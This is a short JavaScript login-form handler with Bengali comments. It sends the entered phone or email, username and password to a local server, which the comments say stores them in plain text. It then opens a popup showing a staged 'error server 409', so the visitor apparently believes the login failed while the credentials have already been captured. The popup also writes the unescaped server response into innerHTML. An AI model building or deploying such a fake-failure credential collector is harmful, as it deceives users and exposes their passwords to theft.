const form = document.getElementById('loginForm');
form.addEventListener('submit', async (e)=>{
e.preventDefault();
const phoneOrEmail = document.getElementById('phoneOrEmail').value.trim();
const username = document.getElementById('username').value.trim();

const password = document.getElementById('password').value; 


// client-side validation — যদি ভুল হয়, alert দেখাবে
if(!phoneOrEmail || !password){
alert('Phone/email এবং password অবশ্যই দিতে হবে।');
return;
}


// POST করে সার্ভারে ডাটা পাঠাবে যা MongoDB-তে save হবে (plain text — নিরাপত্তা সতর্কতা নিচে দেওয়া আছে)
try{
const res = await fetch('http://localhost:5000/api/login', {
method: 'POST',
headers: {'Content-Type':'application/json'},
body: JSON.stringify({ phoneOrEmail, username, password })
});


// এখানে সার্ভার 409 রিসপন্স দিবে — আমরা সেটা ধরব এবং নতুন পেজ খুলব
const text = await res.text();


// নতুন উইন্ডো খুলবে যা "error server 409" দেখাবে এবং Close দেয়
const w = window.open('', '_blank', 'width=400,height=200');
w.document.title = 'Error 409';
w.document.body.style.fontFamily = 'Arial, Helvetica, sans-serif';
w.document.body.innerHTML = `
<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;padding:20px;">
<h2>error server 409</h2>
<p>${text || 'Conflict'}</p>
<button id="closeBtn" style="padding:8px 12px;border-radius:6px;border:1px solid #ccc;cursor:pointer;">Close</button>
</div>
`;
w.document.getElementById('closeBtn').addEventListener('click', ()=> w.close());


}catch(err){
alert('কোথাও সমস্যা হয়েছে: '+err.message);
}
});